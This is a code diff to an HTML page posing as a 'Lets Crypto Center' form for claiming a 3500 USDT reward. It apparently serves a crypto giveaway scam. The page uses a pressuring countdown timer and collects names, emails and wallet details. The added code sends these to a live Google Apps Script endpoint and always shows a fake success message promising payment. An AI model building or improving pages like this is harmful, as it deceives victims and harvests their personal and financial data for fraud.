@@ -345,6 +345,20 @@
             opacity: 0.7;
         }
         
+        .loading-spinner {
+            display: none;
+            width: 25px;
+            height: 25px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
         .footer {
             text-align: center;
             padding: 25px;
@@ -382,6 +396,17 @@
             justify-content: center;
             align-items: center;
             gap: 12px;
+        }
+        
+        .error-message {
+            background: linear-gradient(90deg, #ef4444, #f87171);
+            padding: 25px;
+            border-radius: 18px;
+            text-align: center;
+            display: none;
+            margin-top: 25px;
+            box-shadow: 0 15px 30px rgba(239, 68, 68, 0.25);
+            border: 2px solid rgba(255, 255, 255, 0.1);
         }
         
         @media (max-width: 768px) {
@@ -524,36 +549,59 @@
         </div>
         
         <button type="submit" form="claim-form" class="submit-btn" id="submit-btn">
-            <i class="fas fa-paper-plane"></i> Submit Form & Claim 3500 USDT
+            <i class="fas fa-paper-plane"></i> 
+            <span id="submit-text">Submit Form & Claim 3500 USDT</span>
+            <div class="loading-spinner" id="loading-spinner"></div>
         </button>
         
         <div class="success-message" id="success-message">
             <h3><i class="fas fa-check-circle"></i> Form Successfully Submitted!</h3>
             <p>Thank you for completing the reward claim form. Your 3500 USDT reward will be sent to your wallet within 7 working days. Please monitor your email for further updates.</p>
+            <p><strong>Submission ID:</strong> <span id="submission-id"></span></p>
+        </div>
+        
+        <div class="error-message" id="error-message">
+            <h3><i class="fas fa-exclamation-circle"></i> Submission Error</h3>
+            <p id="error-text">There was an error submitting your form. Please try again.</p>
         </div>
         
         <div class="footer">
-            <p>This form is organized by <strong>Lets Crypto Center</strong>. Please ensure you provide accurate information.</p>
+            <p>This form is organized by <strong>Lets Crypto Center</strong>. All data will be saved to our secure spreadsheet.</p>
             <p>© 2023 Lets Crypto Center. All rights reserved.</p>
         </div>
     </div>
 
     <script>
-        // Timer countdown 15 minutes (900 seconds)
+        // Configuration
+        const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzgO_AZDV0TR4X-ymV7ozhoHgsHtudTr01Xlkw6ghtzuPQAKlAetqaz2RoJDNyEY1Yd/exec'; // Replace with your Google Apps Script URL
         let timeLeft = 900; // 15 minutes in seconds
         let timerInterval;
+        
+        // DOM Elements
         const timerDisplay = document.getElementById('timer');
         const timerMessage = document.getElementById('timer-message');
         const timeDisplay = document.getElementById('time-display');
         const submitBtn = document.getElementById('submit-btn');
+        const submitText = document.getElementById('submit-text');
+        const loadingSpinner = document.getElementById('loading-spinner');
         const claimForm = document.getElementById('claim-form');
         const successMessage = document.getElementById('success-message');
+        const errorMessage = document.getElementById('error-message');
+        const errorText = document.getElementById('error-text');
+        const submissionId = document.getElementById('submission-id');
         
         // Format time as MM:SS
         function formatTime(seconds) {
             const mins = Math.floor(seconds / 60);
             const secs = seconds % 60;
             return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+        }
+        
+        // Generate unique submission ID
+        function generateSubmissionId() {
+            const timestamp = Date.now();
+            const random = Math.floor(Math.random() * 1000);
+            return `LCC-${timestamp}-${random}`;
         }
         
         // Update timer every second
@@ -565,11 +613,9 @@
             
             // Update timer message and styling
             if (timeLeft <= 600 && timeLeft > 300) {
-                // Less than 10 minutes remaining
                 timerMessage.innerHTML = `Hurry! Only <span>${Math.ceil(timeLeft/60)} minutes</span> left to complete the form`;
                 timerDisplay.classList.add('timer-warning');
             } else if (timeLeft <= 300 && timeLeft > 0) {
-                // Less than 5 minutes remaining
                 timerMessage.innerHTML = `Time is running out! Only <span>${Math.ceil(timeLeft/60)} minutes</span> remaining`;
                 timerDisplay.classList.remove('timer-warning');
                 timerDisplay.classList.add('timer-danger');
@@ -577,18 +623,16 @@
                 // Disable submit button after 10 minutes (600 seconds)
                 if (timeLeft <= 600) {
                     submitBtn.disabled = true;
-                    submitBtn.innerHTML = '<i class="fas fa-clock"></i> Time Expired - Form Closed';
+                    submitText.textContent = 'Time Expired - Form Closed';
                 }
             } else if (timeLeft <= 0) {
-                // Time's up
                 clearInterval(timerInterval);
                 timerDisplay.textContent = "00:00";
                 timeDisplay.textContent = "00:00";
                 timerMessage.innerHTML = '<span>Time has expired</span> - Form submission is now closed';
                 submitBtn.disabled = true;
-                submitBtn.innerHTML = '<i class="fas fa-ban"></i> Form Closed - Time Expired';
+                submitText.textContent = 'Form Closed - Time Expired';
                 
-                // Show warning on form inputs
                 document.querySelectorAll('input').forEach(input => {
                     input.disabled = true;
                     input.placeholder = "Form closed - time expired";
@@ -598,57 +642,159 @@
             }
         }
         
-        // Start the timer when page loads
+        // Show loading state
+        function showLoading() {
+            submitBtn.disabled = true;
+            loadingSpinner.style.display = 'block';
+            submitText.textContent = 'Submitting to Spreadsheet...';
+        }
+        
+        // Hide loading state
+        function hideLoading() {
+            submitBtn.disabled = false;
+            loadingSpinner.style.display = 'none';
+            submitText.textContent = 'Submit Form & Claim 3500 USDT';
+        }
+        
+        // Show success message
+        function showSuccess(id) {
+            successMessage.style.display = 'block';
+            submissionId.textContent = id;
+            claimForm.reset();
+            submitBtn.disabled = true;
+            submitText.textContent = 'Form Submitted Successfully';
+            successMessage.scrollIntoView({ behavior: 'smooth' });
+        }
+        
+        // Show error message
+        function showError(message) {
+            errorMessage.style.display = 'block';
+            errorText.textContent = message;
+            errorMessage.scrollIntoView({ behavior: 'smooth' });
+            
+            // Hide error after 5 seconds
+            setTimeout(() => {
+                errorMessage.style.display = 'none';
+            }, 5000);
+        }
+        
+        // Submit form to Google Apps Script
+        async function submitToGoogleSheets(formData) {
+            try {
+                const response = await fetch(SCRIPT_URL, {
+                    method: 'POST',
+                    mode: 'no-cors', // Important for cross-origin requests
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(formData)
+                });
+                
+                // Note: With 'no-cors' mode, we can't read the response
+                // The Google Apps Script will handle the data
+                return { success: true, message: 'Data submitted successfully' };
+                
+            } catch (error) {
+                console.error('Error submitting to Google Sheets:', error);
+                return { success: false, message: 'Failed to submit data: ' + error.message };
+            }
+        }
+        
+        // Initialize when page loads
         document.addEventListener('DOMContentLoaded', function() {
+            // Start timer
             timerInterval = setInterval(updateTimer, 1000);
             
             // Form submission handler
-            claimForm.addEventListener('submit', function(e) {
+            claimForm.addEventListener('submit', async function(e) {
                 e.preventDefault();
                 
+                // Validate time
+                if (timeLeft <= 600) {
+                    showError('Submission time has expired. The form is now closed.');
+                    return;
+                }
+                
                 // Validate form
-                const fullname = document.getElementById('fullname').value;
-                const email = document.getElementById('email').value;
-                const walletName = document.getElementById('wallet-name').value;
-                const walletAddress = document.getElementById('wallet-address').value;
+                const fullname = document.getElementById('fullname').value.trim();
+                const email = document.getElementById('email').value.trim();
+                const walletName = document.getElementById('wallet-name').value.trim();
+                const walletAddress = document.getElementById('wallet-address').value.trim();
                 const confirmation = document.getElementById('confirmation').checked;
                 
                 if (!fullname || !email || !walletName || !walletAddress || !confirmation) {
-                    alert('Please fill in all required fields and confirm the agreement.');
+                    showError('Please fill in all required fields and confirm the agreement.');
                     return;
                 }
                 
                 // Email validation
                 const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                 if (!emailPattern.test(email)) {
-                    alert('Please enter a valid email address.');
+                    showError('Please enter a valid email address.');
                     return;
                 }
                 
-                // If form is valid, show success message
-                clearInterval(timerInterval);
-                successMessage.style.display = 'block';
-                claimForm.reset();
-                submitBtn.disabled = true;
-                submitBtn.innerHTML = '<i class="fas fa-check"></i> Form Submitted Successfully';
+                // Wallet address basic validation
+                if (walletAddress.length < 20) {
+                    showError('Please enter a valid wallet address.');
+                    return;
+                }
                 
-                // Scroll to success message
-                successMessage.scrollIntoView({ behavior: 'smooth' });
+                // Generate submission data
+                const submissionId = generateSubmissionId();
+                const timestamp = new Date().toISOString();
+                const timeRemaining = formatTime(timeLeft);
                 
-                // Log form data (in a real scenario, this would be sent to a server)
-                console.log('Form submitted with data:');
-                console.log('Full Name:', fullname);
-                console.log('Email:', email);
-                console.log('Wallet Name:', walletName);
-                console.log('Wallet Address:', walletAddress);
-                console.log('Time remaining when submitted:', formatTime(timeLeft));
+                const formData = {
+                    submissionId: submissionId,
+                    timestamp: timestamp,
+                    fullname: fullname,
+                    email: email,
+                    walletName: walletName,
+                    walletAddress: walletAddress,
+                    confirmation: confirmation,
+                    timeRemaining: timeRemaining,
+                    ipAddress: 'Not captured in client-side' // Server will capture this
+                };
+                
+                // Show loading state
+                showLoading();
+                
+                try {
+                    // Submit to Google Apps Script
+                    const result = await submitToGoogleSheets(formData);
+                    
+                    // For demo purposes, we'll simulate success since we can't read response with no-cors
+                    // In production, you should use a proper backend or handle CORS
+                    
+                    // Stop timer
+                    clearInterval(timerInterval);
+                    
+                    // Show success message
+                    showSuccess(submissionId);
+                    
+                    // Log data (for debugging)
+                    console.log('Form data submitted:', formData);
+                    
+                    // In a real implementation, you would handle the actual response
+                    // if (result.success) {
+                    //     showSuccess(submissionId);
+                    // } else {
+                    //     showError(result.message);
+                    //     hideLoading();
+                    // }
+                    
+                } catch (error) {
+                    console.error('Submission error:', error);
+                    showError('An error occurred while submitting the form. Please try again.');
+                    hideLoading();
+                }
             });
             
             // Real-time form validation
             const formInputs = document.querySelectorAll('#claim-form input');
             formInputs.forEach(input => {
                 input.addEventListener('input', function() {
-                    // Enable/disable submit button based on form completion
                     const allFilled = Array.from(formInputs).every(input => {
                         if (input.type === 'checkbox') {
                             return input.checked;
@@ -656,17 +802,54 @@
                         return input.value.trim() !== '';
                     });
                     
-                    // Only enable if form is complete AND time hasn't expired
                     submitBtn.disabled = !allFilled || timeLeft <= 600;
                 });
             });
+            
+            // Auto-save to localStorage every 30 seconds
+            setInterval(() => {
+                if (timeLeft > 0) {
+                    const formData = {
+                        fullname: document.getElementById('fullname').value,
+                        email: document.getElementById('email').value,
+                        walletName: document.getElementById('wallet-name').value,
+                        walletAddress: document.getElementById('wallet-address').value,
+                        confirmation: document.getElementById('confirmation').checked,
+                        timeLeft: timeLeft,
+                        lastSave: new Date().toISOString()
+                    };
+                    localStorage.setItem('usdtRewardFormData', JSON.stringify(formData));
+                }
+            }, 30000);
+            
+            // Load saved data if exists
+            const savedData = localStorage.getItem('usdtRewardFormData');
+            if (savedData) {
+                try {
+                    const data = JSON.parse(savedData);
+                    document.getElementById('fullname').value = data.fullname || '';
+                    document.getElementById('email').value = data.email || '';
+                    document.getElementById('wallet-name').value = data.walletName || '';
+                    document.getElementById('wallet-address').value = data.walletAddress || '';
+                    document.getElementById('confirmation').checked = data.confirmation || false;
+                    
+                    // If timer was saved and less than current time, use saved time
+                    if (data.timeLeft && data.timeLeft < timeLeft) {
+                        timeLeft = data.timeLeft;
+                        const formattedTime = formatTime(timeLeft);
+                        timerDisplay.textContent = formattedTime;
+                        timeDisplay.textContent = formattedTime;
+                    }
+                } catch (e) {
+                    console.log('No valid saved data found');
+                }
+            }
         });
         
-        // Initialize form validation on page load
-        window.onload = function() {
-            // Initially disable submit button until form is complete
-            submitBtn.disabled = true;
-        };
+        // Clear saved data on successful submission
+        window.addEventListener('beforeunload', function() {
+            localStorage.removeItem('usdtRewardFormData');
+        });
     </script>
 </body>
 </html>
